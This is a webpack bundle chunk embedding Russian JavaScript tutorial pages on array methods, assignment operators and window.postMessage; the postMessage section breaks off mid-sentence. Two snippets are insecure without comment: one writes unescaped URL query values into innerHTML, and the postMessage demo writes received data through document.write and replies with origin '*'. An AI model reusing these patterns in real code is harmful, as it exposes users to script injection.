5••\n\nПочему дважды? Потому, что всего элементов в массиве 3, но первый элемент стал стартовым значением переменной-аккумулятора.\n\nЕсли мы добавим вот такой метод **~root~** в прототип конструктора **~Array~**, то результат его вызова будет тем же:\n\n~~~js\nArray.prototype.root = function () {\n  return Math.pow(this[0], Math.pow(0.5, this.length - 1))\n}\n\n;[625, 0, 0].root() // 5\n~~~\n____________________________________________\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\n[0, 0, 0].reduce(Math.sqrt, 625 * 625) // 5\n~~~\n\nВ этом примере мы задаем стартовое значение **переменной-аккумулятора** (625 * 625) вторым аргументом метода **~reduce~**.\nПоэтому число итераций (т.е. сколько раз будет извлечен корень квадратный из **переменной-аккумулятора**) будет равно числу элементов массива.\n\n{{{Array-iteration-methods-reduce-7.js}}}\n\n_______________________________\n\n### Math.pow\n\nТеперь будем передавать методу **~reduce~** первым аргументом библиотечную функцию **Math.pow** (возведение в степень).\nЭта функция принимает два числовых аргумента: число, которое нужно возвести в степень, и значение степени.\n\nЕсли мы не передаем стартовое значение **переменной-аккумулятора** вторым аргументом метода **~reduce~**, то в этом качестве будет использовано значение первого элемента массива.\nОстальные элементы массива будут значениями степени, в которую нужно возвести текущее значение **переменной-аккумулятора**.\n\nЕсли же мы передаем стартовое значение **переменной-аккумулятора**, то все элементы массива будут рассматриваться как степень, в которую нужно возвести текущее значение **переменной-аккумулятора**.\n\n◘◘![ico-20 cap] ** 10**◘◘\n\n~~~js\nconsole.log([3, 2, 2].reduce(Math.pow))    // 81\n\nconsole.log(Math.pow(Math.pow(3, 2), 2))   // 81\n\nconsole.log([2, 3, 3].reduce(Math.pow))    // 512\n\nconsole.log(Math.pow(Math.pow(2, 3), 3))   // 512\n\nconsole.log([2, 2, 2].reduce(Math.pow, 2)) // 256\n\nMath.pow(Math.pow(Math.pow(2, 2), 2), 2)   // 256\n~~~\n\n{{{Array-iteration-methods-reduce-10.js}}}\n\nЕсли мы добавим в прототип конструктора **~Array~** метод **~pow~**, то этот метод будет работать аналогично методу **~reduce~**, вызванному с библиотечной функцией **~Math.pow~** и без второго аргумента:\n\n~~~js\nArray.prototype.pow = function () {\n  let res = this[0]\n  for (const item of this.slice(1)) {\n    res = Math.pow(res, item)\n  }\n  return res\n}\n\n[3, 2, 2].pow() // 81\n~~~\n\n______________________________________\n\n### ![ico-25 hw] Тесты\n\nЧто вернут следующие выражения:\n\n◘◘** 1**◘◘\n\n→→→ [].reduce(Math.pow) | TypeError, null, NaN, 0 | TypeError →→→\n\n◘◘** 2**◘◘\n\n→→→ [].reduce(Math.sqrt, 'Google') | TypeError, null, NaN, 0, 'Google' | Google →→→\n\n◘◘** 3**◘◘\n\n→→→ [1].reduce(Math.sqrt, 'Google') | TypeError, null, NaN, 0, 'Google' | NaN →→→\n\n◘◘** 4**◘◘\n\n→→→ [-10, -20, 5].reduce(Math.abs) | null, NaN, 0, 10, 20, 5 | 10 →→→\n\n◘◘** 5**◘◘\n\n→→→ [.5].reduce(Math.pow, 49) | null, NaN, 0, 7, 49, 5 | 7 →→→\n\n_________________________________\n\n## ![ico-25 icon] sort()\n\nЧисло итераций будет заведомо больше, чем число элементов массива.\n\nМетод сортирует массив согласно заданному условию сортировки.\nУсловие сортировки проверяет передаваемая методу функция-аргумент.\n_Функция-аргумент имеет два формальных параметра, значения которых используются для сравнения_.\n\nФункция возвращает одно из трех значений:\n\n|  0 | элементы совпали (равны)       |\n|  1 | первый аргумент больше второго |\n| -1 | второй аргумент больше первого |\n\nНа основании возвращенного функцией значения метод меняет порядок следования элементов в массиве.\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nvar sourceArray = [\n  { title: 'fond', value: 100 },\n  { title: 'salary', value: 400 },\n  { title: 'bonus', value: 70 },\n  { title: 'debt', value: 700 },\n  { title: 'credit', value: 200 },\n  { title: 'payments', value: 150 },\n  { title: 'income', value: 320 },\n]\nvar resArray = sourceArray.sort(function (x, y) {\n  return x.value - y.value\n})\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n▼ (7) [{…}, {…}, {…}, {…}, {…}, {…}, {…}]\n  ► 0: {title: \"bonus\", value: 70}\n  ► 1: {title: \"fond\", value: 100}\n  ► 2: {title: \"payments\", value: 150}\n  ► 3: {title: \"credit\", value: 200}\n  ► 4: {title: \"income\", value: 320}\n  ► 5: {title: \"salary\", value: 400}\n  ► 6: {title: \"debt\", value: 700}\n    length: 7\n  ► __proto__: Array(0)\n~~~\n\n^^Для понимания механизма сортировки выведем в консоль значения сравниваемых элементов массива на каждой итерации:^^\n\n◘◘![ico-20 cap] ** 2**◘◘\n~~~js\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    console.log(`${x.title} - ${y.title} = ${x.value - y.value}`)\n    return  x.value - y.value\n  })\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\nfond - bonus = 30\npayments - fond = 50\ncredit - payments = 50\nincome - credit = 120\nsalary - income = 80\ndebt - salary = 300\n~~~\n\n^^^[Логирование]\n^^Создадим массив **log**, в котором будем логировать все операции в процессе сортировки массива.^^\n~~~js\nvar log = []\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    log.push({\n      id: x.title + \" > \" + y.title,\n      res: x.value > y.value\n    })\n    return  x.value - y.value\n  })\n~~~\n**log**\n~~~console\n▼ (13) [...]\n  ► 0: {id: 'salary > fond', res: true}\n  ► 1: {id: 'bonus > salary', res: false}\n  ► 2: {id: 'bonus > salary', res: false}\n  ► 3: {id: 'bonus > fond', res: false}\n  ► 4: {id: 'debt > fond', res: true}\n  ► 5: {id: 'debt > salary', res: true}\n  ► 6: {id: 'credit > salary', res: false}\n  ► 7: {id: 'credit > fond', res: true}\n  ► 8: {id: 'payments > credit', res: false}\n  ► 9: {id: 'payments > fond', res: true}\n  ► 10: {id: 'income > credit', res: true}\n  ► 11: {id: 'income > debt', res: false}\n  ► 12: {id: 'income > salary', res: false}\n    length: 13\n  ► __proto__: Array(0)\n~~~\n^^^\n\nИтак, в отличие от других итерирующих методов, функция, передаваемая методу в качестве единственного аргумента, принимает строго два параметра.\n\n![ico-20 warn] Этому методу нельзя передать ссылку на контекст вызова.\n\n![ico-20 require] Самостоятельно попробуйте нарисовать блок-схему алгоритма сортировки массива методом  **~sort()~**.\n\n__________________________\n\n## ![ico-25 icon] flatMap()\n\nЕсть строка **cookie**:\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nvar cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n~~~\n\nСплитим строку **cookie** и применим метод **~map~** к полученному массиву.\n\n~~~js\nconsole.log(cookie.split('; ').map(item => item.split('='))\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ (3) [Array(2), Array(2), Array(2)]\n  ► 0: (2) [\"name\", \"user\"]\n  ► 1: (2) [\"token\", \"Jd7-js15/84\"]\n  ► 2: (2) [\"interest\", \"javascript\"]\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\nМы получили массив, элементы которого являются массивами\n\nТеперь применим метод **~flatMap~** к массиву **cookie**\n\n~~~js\nconsole.log(cookie.split('; ').flatMap(item => item.split('='))\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n► (6) [\"name\", \"user\", \"token\", \"Jd7-js15/84\", \"interest\", \"javascript\"]\n~~~\n\nМы получили \"плоский\" массив.\n\nИтак, используя одну и ту же функцию:\n\n~~~js\nfunction (item) {\n  return item.split('=')\n}\n~~~\n\nмы получили в первом случае массив массивов, а во втором - \"плоский\" массив\n\n____________________________________________________\n\n## ![ico-25 icon] keys()\n\n**Генератор**.\n**Возвращает объект _итератора_**.\n\n◘◘![ico-20 cap] **keys**◘◘\n\n~~~js\nconst cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n  .split('; ')\n  .map(item => item.split('='))\n\nconst iterator = cookie.keys()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(cookie[value][0], cookie[value][1])\n} while (!done)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\nname user\ntoken Jd7-js15/84\ninterest javascript\n~~~\n\n\n______________________\n\n## ![ico-25 icon] values()\n\n**Генератор**.\n**Возвращает объект _итератора_**.\n\n◘◘![ico-20 cap] **values**◘◘\n\n~~~js\nconst cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n\nconst iterator = cookie\n  .split ('; ')\n  .map(item => item.split('='))\n  .values()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(value)\n} while (!done)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n► (2) [\"name\", \"user\"]\n► (2) [\"token\", \"Jd7-js15/84\"]\n► (2) [\"inerest\", \"javascript\"]\n~~~\n\n_____________________________________________\n\n## ![ico-30 icon] Примеры и тесты\n\n_________________________________________\n\n### ![ico-25 cap] Сумма кеша на картах\n\nСоздадим массив банковских карт, и с помощью метода **~reduce~** посчитаем сумму средств на всех картах:\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.reduce((result, card) => result + card.cash, 0)  // 10300\n~~~\n\n___________________________________________________\n\nСоздадим новую карту, на которую аккумулируем остатки на счетах все карт:\n\n~~~js\ncards.reduce((result, card) => ({\n  num: result.num,\n  cash: result.cash + card.cash\n}), { num: '457855155', cash: 0 })\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ { num: \"457855155\", cash: 10300 }\n    cash: 10300\n    num: \"457855155\"\n  ► __proto__: Object\n~~~\n\nДля чистоты результата дополнительно обнулим остатки на счетах других карт:\n\n~~~js\ncards.reduce((result, card) => {\n  const cash = card.cash\n  card.cash = 0\n  return {\n    num: result.num,\n    cash: result.cash + cash\n  }\n}, { num: '457855155', cash: 0 })\n~~~\n\n**Теперь исходный массив карт будет:**\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {num: \"457892425\", cash: 0}\n  ► 1: {num: \"457812840\", cash: 0}\n  ► 2: {num: \"457855780\", cash: 0}\n  ► 3: {num: \"457811714\", cash: 0}\n    length: 4\n  ► __proto__: Array(0)\n\n~~~\n\n__________________________________________\n\n### ![ico-25 cap] Чистка от дублей\n\nПредположим, что у нас есть массив юзеров, и мы решили получить массив всех специальностей, которые есть у этих юзеров.\n~~~js\nconst users = [\n  { name: 'Watson Armstrong', speciality: 'developer' },\n  { name: 'Marcelo Anthony', speciality: 'doctor' },\n  { name: 'Eva Randall', speciality: 'teacher' },\n  { name: 'Stephen Meyer', speciality: 'worker' },\n  { name: 'Isabella Drake', speciality: 'teacher' },\n  { name: 'Rafael Gilbert', speciality: 'developer' },\n  { name: 'Adrianna Schultz', speciality: 'doctor' },\n  { name: 'Kira Hall', speciality: 'teacher' },\n  { name: 'Carmen Duarte', speciality: 'musician' },\n  { name: 'Anika Burton', speciality: 'developer' },\n  { name: 'Hugo Gray', speciality: 'worker' },\n  { name: 'Scott Hahn', speciality: 'worker' }\n]\n\nconst specialities = users.map(user => user.speciality)\n~~~\n\nОднако, как мы видим, многие специальности будут дублироваться, что нам абсолютно не нужно.\n\n◘◘**^^specialities^^**◘◘\n~~~console\n▼ [...]\n   0: \"developer\"\n   1: \"doctor\"\n   2: \"teacher\"\n   3: \"worker\"\n   4: \"teacher\"\n   5: \"developer\"\n   6: \"doctor\"\n   7: \"teacher\"\n   8: \"musician\"\n   9: \"developer\"\n  10: \"worker\"\n  11: \"worker\"\n  length: 12\n  ► [[Prototype]]: Array(0)\n~~~\n\nНужно удалить дублирующиеся элементы массива **~specialities~**.\n\n![ico-20 warn] Сразу заметим, что проще всего достичь этого с помощью конструктора **~Set~**:\n\n~~~js\nArray.from(new Set(specialities))\n~~~\n\nНо мы решили пойти более сложным путем ![ico-25 wink].\n\n~~~js\nconst arr = [\n  'google',\n  'mozilla',\n  'ie',\n  'mozilla',\n  'mozilla',\n  'google',\n  'mozilla',\n  'ie',\n  'ie',\n  'google'\n]\n~~~\n\n~~~js\narr.reduce((result, item) => {\n  result.indexOf(item) < 0 ? result.push(item) : null\n  return result\n}, [])\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ (3) [\"google\", \"mozilla\", \"ie\"]\n    0: \"google\"\n    1: \"mozilla\"\n    2: \"ie\"\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n_________________________________________________\n\n### ![ico-25 cap] Число отрезков в интервале\n\nЕсть несколько отрезков на числовой оси:\n\n~~~js\nconst intervals = [[10, 20], [4, 18], [7, 10], [5, 16], [9, 13], [11, 15], [7, 15], [10, 12], [12, 19]]\n~~~\n\nДля каждого отрезка нужно посчитать, сколько отрезков оказалось внутри него.\n\nДля упрощения кода добавим в прототип конструктора **~Array~** метод **~testSegment~**:\n~~~js\nArray.prototype.interior = function (interval = [0, 1]) {\n  return this[0] < interval[0] && this[1] > interval[1]\n}\n~~~\nТеперь можно сравнить два отрезка обчень просто:\n~~~js\n[18, 35].interior([4, 18]) // false\n[18, 35].interior([20, 28]) // true\n~~~\nТеперь мы можем выполнить поставленную задачу:\n~~~js\nintervals\n  .map((segment, index, array) => array.filter(interval => segment.interior(interval)).length)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n► (9) [2, 6, 0, 5, 1, 0, 2, 0, 0]\n~~~\n\n__________________________\n\n### ![ico-25 cap] Проверка парных скобок\n\nЗадача: проверить парность и правильность расстановки скобок.\n\nНапример, валидация строки \"({})[([])]\" должна пройти нормально (вернуть ~true~),\nа валидация строки \"({(})[([)])]\" должна вернуть ~false~.\n\nДля удобства использования создадим наследуемый метод строк:\n\n◘◘![ico-20 cap] **Brackets validation**◘◘\n\n~~~js\nString.prototype.testBrackets = (function () {\n  const brackets = {\n    '[': ']',\n    '{': '}',\n    '(': ')'\n  }\n\n  const all = ['[', '{', '(', ']', '}', ')']\n\n  return function () {\n    const self = this\n      .split('')\n      .filter(char => all.includes(char))\n\n    let stack = [], result = ''\n\n    self\n      .forEach(symbol => {\n        if (!brackets[symbol] && stack.length === 0) return false\n\n        brackets[symbol] ? stack.push(symbol) : symbol = brackets[stack.pop()]\n\n        result += symbol\n      })\n\n    return result === self.join('') && stack.length === 0\n  }\n})()\n~~~\n\n~~~js\n'( [ ( { ( ( {(} ([]) ) ) } ) ] )'.testBrackets()   // false\n\nString.prototype.testBrackets.toString().testBrackets()  // true\n~~~\n\n{{{Array-iteration-methods-brackets.js}}}\n___________________________________________________\n\n### ![ico-25 cap] location\n\n~~~js\nfunction getSearchObject () {\n  const obj = {}\n\n  location.search\n    .slice(1)\n    .split(',')\n    .map(x => x.split('='))\n    .map(function (item) { this[item[0]] = item[1] }, obj)\n\n    return obj\n}\n\nvar searchObject = getSearchObject ()\nfor (const rec in searchObject) {\n  document.body.innerHTML += `<p>${rec}: ${searchObject[rec]}</p>`\n}\n~~~\n\n[:::**Live demo**:::](samples/11)\n\n_____________________________________________\n\n### ![ico-25 cap] getComputedStyle\n\nПерейдите по [**_ссылке_**](https://en.wikipedia.org/wiki/Idempotence ) и в консоли страницы выполните код:\n\n~~~js\nArray.from(document.getElementsByClassName('interlanguage-link'))\n  .map(item => getComputedStyle(item))\n  .forEach(item => console.log(item['font-family']))\n~~~\n\n________________________________________________\n\n[![ico-30 hw] **Тесты**](quiz/arrayIterationMethods)\n"},29242:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Методы массивов\n\n______________________________________________________\n\n### push\n\nЭтот метод добавляет новый элемент в конец массива.\nАргументом, который получает метод при вызове, является добавляемый элемент.\nМетод возвращает новую длину массива.\n\n^^^[push()]\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar array = ['Nail', 'Bicycle', 'Processor', 'Disk']\nvar length = array.push('Program')\n~~~\n\n^^После выполнения этого кода в массиве **array** будут элементы:^^\n\n••['Nail', 'Bicycle', 'Processor', 'Disk', 'Program']••\n\n\n^^а значение переменной **~length~** будет 5^^\n\n^^^\n\n____________________________________________________________________\n\n### pop\n\n^^^[pop()]\n\nЭтот метод удаляет последний элемент массива и возвращает удаленный элемент\n\nУ метода нет параметров (аргументов)\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar array = ['Nail', 'Bicycle', 'Processor', 'Disk', 'Program']\nvar elem = array.pop()\n~~~\n\n^^После выполнения этого кода в массиве **array** останутся:^^\n\n••['Nail', 'Bicycle', 'Processor', 'Disk']••\n\n^^а значение переменной  ~elem~  будет  'Program'^^\n^^^\n\n_________________________________________________________________________\n\n### shift\n\nЭтот метод удаляет первый элемент из массива.\nВозвращаемое значение - удаленный элемент.\n\n^^^[shift()]\n\n![ico-25 cap] ** 1**\n\n^^Например, в результате выполнения следующего кода:^^\n\n~~~js\nvar arrayOfThings = ['Nail', 'Bicycle', 'Processor', 'Disk', 'Program']\nconsole.log(arrayOfThings.shift())\n~~~\n\n^^в консоли будет:  _Nail_^^\n\n^^а массив **arrayOfThings** будет содержать значения:^^\n\n••['Bicycle', 'Processor', 'Disk', 'Program']••\n\n^^^\n\n______________________________________________________\n\n### unshift\n\nМетод добавляет новый элемент в начало массива.\nВозвращаемое значение - новая длина массива (число).\n\n^^^[unshift()]\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar drinks = ['coffee', 'tea', 'juice', 'water', 'milk']\nvar len = drinks.unshift('beer')\n~~~\n\n^^В результате массив **drinks** будет содержать элементы:^^\n\n••['beer', 'coffee', 'tea', 'juice', 'water', 'milk']••\n\n^^а переменная ~len~ примет значение 6^^\n^^^\n\n___________________________________________________________________\n\n### splice\n\nПервый аргумент (число) определяет положение (индекс), куда будут вставлены новые элементы.\nВторой аргумент (число) определяет, сколько элементов (начиная с позиции вставки) должно быть удалено из массива.\nТретий (четвертый, пятый ...) аргументы - это элементы, которые нужно вставить в массив.\nМетод возвращает удаленные элементы массива (массив).\n\n^^^[splice()]\n\nС помощью метода ~splice()~ можно заменить элементы в массиве:\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar myArray = [1, 2, 3, 4, 5]\nconsole.log(myArray.splice(2, 1, '*'))\n~~~\n\n^^В результате массив **myArray** будет:^^\n\n••[1, 2, '*', 4, 5]••\n\n^^а в консоль будет выведено: ~[3]~^^\n^^(массив элементов, которые были заменены на '*')^^\n\n_____________________________________\n\n![ico-25 cap] ** 2**\n\n~~~js\nvar myArray = [1, 2, 3, 4, 5]\nconsole.log(myArray.splice(2, 2, '*', '#', '$', '%'))\n~~~\n\n^^В результате массив **myArray** будет:^^\n\n\n••[1, 2, '*', '#', '$', '%', 5]••\n\n\n^^а в консоль будет выведено: ~[3, 4]~^^\n^^(элементы, которые были заменены элементами '*', '#', '$', '%')^^\n\n______________________________________\n\n![ico-25 cap] ** 3**\n\n~~~js\nvar myArray = [1, 2, 3, 4, 5]\nconsole.log(myArray.splice(2, 2, [7, 8, 9]))\n~~~\n\n^^В результате массив **myArray** будет состоять из четырех элементов:^^\n\n••[1, 2, Array(3), 5]••\n\n\n^^а в консоль будет выведено: ~[3, 4]~^^\n\n^^(элементы, которые были заменены массивом [7, 8, 9])^^\n\n__________________________________________________\n\n![ico-25 cap] ** 4**\n\n~~~js\nvar myArray = [1, 2, 3, 4, 5]\nconsole.log(myArray.splice(2, 0, 'Новый элемент'))\n~~~\n\n^^В результате массив **myArray** будет состоять из четырех элементов:^^\n\n••[1, 2, 'Новый элемент', 3, 4, 5]••\n\n^^а в консоль будет выведен пустой массив: ~[]~^^\n\n^^(ни одного элемента не было удалено из массива, поскольку второй аргумент метода равен нулю)^^\n\n^^^\n\n____________________________________________________________________\n\n### slice\n\nМетод создает новый массив, содержащий фрагмент исходного массива.\nПри этом исходный массив не изменяется.\nВозвращаемое значение - новый массив, являющийся фрагментом исходного массива.\nПервый фргумент (число) - индекс элемента исходного массива, с которого начинается фрагмент.\nВторой аргумент (число) - индекс элемента исходного массива, до которого продолжается фрагмент.\nЕсли опустить второй аргумент, то фрагмент будет взят до конца исходного массива.\n\n^^^[slice()]\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar array = ['one', 'two', 'three', 'four', 'five']\nvar result = array.slice(1, 2) // ['two']\n~~~\n\n![ico-25 cap] ** 2**\n\n~~~js\nvar array = ['one', 'two', 'three', 'four', 'five']\nvar result = array.slice(1, -2) // ['two', 'three']\n~~~\n\n![ico-25 cap] ** 3**\n\n~~~js\nvar array = ['one', 'two', 'three', 'four', 'five']\nvar result = array.slice(-2) // ['four', 'five']\n~~~\n\n![ico-25 cap] ** 4**\n\n~~~js\nvar array = ['one', 'two', 'three', 'four', 'five']\nvar result = array.slice(-4, -2) // ['two', 'three']\n~~~\n\n![ico-25 cap] ** 5**\n\n~~~js\nvar array = ['one', 'two', 'three', 'four', 'five']\nvar result = array.slice(-8, 25) // ['one', 'two', 'three', 'four', 'five']\n~~~\n\n![ico-25 cap] ** 6**\n\n~~~js\nvar array = ['one', 'two', 'three', 'four', 'five']\nvar result = array.slice(4, 3) // []\n~~~\n\n^^^\n\n_____________________________________________________________________\n\n### concat\n\nМетод объединяет два или более массива в один массив.\nВозвращаемое значение - новый массив.\nИсходные массивы не изменятся.\n\n^^^[concat()]\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar first = ['one', 'two', 'three']\nvar second = ['four', 'five']\nvar result = first.concat(second)\n~~~\n\n^^**result**:^^\n••['one', 'two', 'three', 'four', 'five']••\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar numbers = [1, 2, 3, 4]\nvar additional = [7, 8, 9]\nvar result = [11, 0, 5]\n\nresult = result.concat(numbers, additional)\n~~~\n\n^^**result**:^^\n••► (10) [11, 0, 5, 1, 2, 3, 4, 7, 8, 9]••\n\n^^^\n\n____________________________________________________________________________\n\n### join\n\nОбъединяет все элементы массива в строку ('string').\nАргумент - символ-разделитель.\n\n^^^[join()]\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar drinks = ['coffee', 'tea', 'juice', 'water', 'milk']\nvar menu = drinks.join(' | ')\n~~~\n\n^^**menu**:^^\n\n••'coffee | tea | juice | water | milk'••\n\n^^^\n\n_____________________________________________________________\n\n### includes\n\n**ES 2016**\n\nМетод **~includes()~** возвращает ~true~, когда значение, переданное аргументом, содержится в массиве, или ~false~ в противном случае.\n\n^^^[includes()]\n\n![ico-25 cap] ** 1**\n\n~~~js\nvar users = ['Ivan', 'George', 'Stephan']\n\nusers.includes('Stephan')  // true\nusers.includes('Mary')     // false\n~~~\n\n_______________________________________________________________\n\n![ico-25 cap] ** 2**\n\n![ico-20 warn] Если элементами массива являются объекты, то метод не будет работать, поскольку массивы и объекты - это ссылочные типы данных.\n\n~~~js\nvar users = [\n  {\n    name: 'Ivan',\n    email: 'ivan78@gmail.com'\n  },\n  {\n    name: 'Georg',\n    email: 'georg.klep@gmail.com'\n  },\n  {\n    name: 'Stephan',\n    email: 'stephan.borg@gmail.com'\n  }\n]\n\nusers.includes({\n  name: 'Stephan',\n  email: 'stephan.borg@gmail.com'\n})\n\n//  false\n~~~\n\n______________________________________________________________\n\n![ico-25 cap] ** 3**\n\n~~~js\nvar points = [[100, 20], [200, 150], [120, 50]]\n\npoints.includes([100, 20])   // false\n~~~\n\n^^^\n\n_____________________________________________________________________\n\n[![ico-30 hw] Тесты](quiz/arrayMethods)\n"},8014:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30] Операторы присваивания\n\nВ результате операции присваивания устанавливается тип данных переменной\n\nЭто и есть **динамическая типизация**\n\n_________________________________________________________\n\n## ![ico20] Оператор =\n\nС помощью оператора **~ = ~** переменным присваиваются значения\n\n^^![ico-20 warn] не путайте оператор присваивания с оператором сравнения^^\n\n◘◘![ico-25 cap] 1◘◘\n\n~~~js\nvar start = 'Hello'\nvar end = 'bye'\n\nend = start\n~~~\n\nТеперь в переменной  **~end~**  будет  значение  'Hello'\n\n_________________________________________________________________\n\n◘◘![ico-25 cap] 2◘◘\n\n~~~js\nvar x = 5\nvar res = x + 4\n~~~\n\nЗначением переменной **~res~** будет 9\n\n_________________________________________________________________\n\n## ![ico-25 icon] Оператор +=\n\nДобавляет значение к переменной\n\n◘◘![ico-25 cap] 3◘◘\n\n~~~js\nvar x = 0\nx += 5\nconsole.log(x)   // 5\n~~~\n\n◘◘![ico-25 cap] 4◘◘\n\n~~~js\nvar y = 10\nx += y\nconsole.log(x)   // 15\n~~~\n\n_________________________________________________________\n\n## ![ico-25 icon] Оператор -=\n\nВычитает значение из переменной\n\n◘◘![ico-25 cap] 5◘◘\n\n~~~js\nvar x = 20\nx -= 5\nconsole.log(x)   // 15\n\nvar y = 10\nx -= y\nconsole.log(x)   // 5\n~~~\n\n_________________________________________________________\n\n## ![ico-25 icon] Оператор *=\n\nУмножает переменную на значение\n\n◘◘![ico-25 cap] 6◘◘\n\n~~~js\nvar x = 5\nx *= 5\nconsole.log(x)   // 25\n\nvar y = 10\nx *= y\nconsole.log(x)   // 250\n~~~\n\n_________________________________________________________\n\n## ![ico-25 icon] Оператор /=\n\nДелит переменную на значение\n\n◘◘![ico-25 cap] 7◘◘\n\n~~~js\nvar x = 30\nx /= 5\nconsole.log(x)   // 6\n\nvar y = 3\nx /= y\nconsole.log(x)   // 2\n~~~\n\n_________________________________________________________________\n\n## ![ico-25 icon] Оператор %=\n\nПрисваивает переменной остаток от деления\n\n◘◘![ico-25 cap] 8◘◘\n\n~~~js\nvar x = 17\nx %= 5\nconsole.log(x)         // 2\n\nvar x = 16, y = 3\nx %= y\nconsole.log(x)         // 1\n\nvar x = 20, y = 3\nconsole.log( x %= y )  // 2\n\nvar x = 25, y = 6\nconsole.log( x %= y )  // 2\n~~~\n\n_________________________________________________________________\n\n[![ico-30 hw] **Упражнения**](test/assignments)\n"},8046:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Browser Object Model\n\n## ![ico-25 icon] window.postMessage()\n\n^^![ico-20 warn] Для понимания этого раздела нужно познакомиться с событийной моделью браузера^^\n___________________________________________________\n\n^^Все свойства объекта window, начинающиеся на \"on\", позволяют привязать функции к событиям окна^^\n\n~~~js\nfor (var key in window) {\n  key.indexOf('on') === 0 && console.log(key)\n}\n~~~\n\n^^После \"on\" в имени свойства следует название типа события^^\n\n#### ![ico-20 icon]  onmessage\n\n^^Событие **~message~** возникает при получении окном сообщения из другого открытого окна браузера^^\n^^Если на свойство **~onmessage~** \"повесить\" функцию ( callback ), то эта функция будет вызвана при наступлении события **~message~**^^\n\n~~~js\nwindow.onmessage = function (event) {\n  console.log(event)\n}\n~~~\n\n^^Предположим, текущее окно получило сообщение \"_Hello, I'm listening to you_\"^^\n^^Теперь будет вызван обработчик события и в консоли мы увидим примерно следующее:^^\n\n~~~console\n\n▼ MessageEvent {isTrusted: true, data: \"Hello, I'm listening to you\", origin: \"null\", lastEventId: \"\", source: Window, …}\n    bubbles: false\n    cancelBubble: false\n    cancelable: false\n    composed: false\n  ► currentTarget: Window {postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, parent: Window, …}\n    data: \"Hello, I'm listening to you\"\n    defaultPrevented: false\n    eventPhase: 0\n    isTrusted: true\n    lastEventId: \"\"\n    origin: \"null\"\n  ► path: [Window]\n  ► ports: []\n    returnValue: true\n  ► source: Window {postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, parent: Window, …}\n  ► srcElement: Window {postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, parent: Window, …}\n  ► target: Window {postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, parent: Window, …}\n    timeStamp: 5.620000010821968\n    type: \"message\"\n    userActivation: null\n  ► __proto__: MessageEvent\n~~~\n\n^^Как мы видим, переданный обработчику объект события несет в себе много полезной информации^^\n^^В частности, мы можем узнать, из какого окна пришло сообщение ( свойство **_~source~_** объекта **~event~** )^^\n^^Текст сообщения мы получим в свойстве **_~data~_** объекта **~event~**^^\n^^В свойстве **_~target~_** объекта **~event~** будет ссылка на окно ( вкладку ), которое получило сообщение^^\n\n^^Пришло время разобраться, как отправить сообщение из одной открытой вкладки бразера в другую^^\n_____________________________________\n\n**postMessage()** - метод, позволяющий послать сообщение из одного открытого окна в другое открытое окно браузера\n\n![ico-25 cap] **Пример**\n\n^^Откройте пустую вкладку ( в адресной строке браузера наберите **~about:blank~** )^^\n^^Установим значение \"parentWin\" для свойства **~name~** активного окна ( вкладки )^^\n^^Для этого в консоли активного окна ( вкладки ) выполним код:^^\n\n~~~js\nwindow.name = \"parentWin\"\n~~~\n\n^^Теперь установливаем обработчика события **~message~** активной вкладки (анонимную функцию связываем со свойством **~onmessage~** объекта ~window~):^^\n\n~~~js\nwindow.onmessage = function (event) {\n  this.document.write(`<h3>${this.name}</h3><p>Message received</p><b><em>${event.data}</em></b>`)\n}\n~~~\n\n^^![ico-20 warn] Обработчик события должен всегда получать объект события^^\n^^( для этого нужно устанавливать формальный параметр обработчика )^^\n^^В нашем примере формальный параметр имеет идентификатор **~event~**, и внутри анонимной функции-обработчика в этой переменной будет ссылка на объект события, которое привело к вызову этой функции^^\n\n^^Теперь откроем новое (дочернее) окно (вкладку):^^\n\n~~~js\nvar childWin = window.open('about:blank', 'childWin')\n~~~\n\n^^Как видите, ссылку на новую открытую вкладку мы поместили в переменную **childWin**^^\n^^Установим обработчика события **~onmessage~** новой вкладки:^^\n\n~~~js\nchildWin.onmessage = function (event) {\n  childWin.document.write(`<h3>${this.name}</h3><p>I've received the message from ${event.source.name}</p><b><em>${event.data}</em></b>`)\n  event.source.postMessage('Wecome any time, my dear!', '*')\n}\n~~~\n\n^^При получении сообщения вкладка 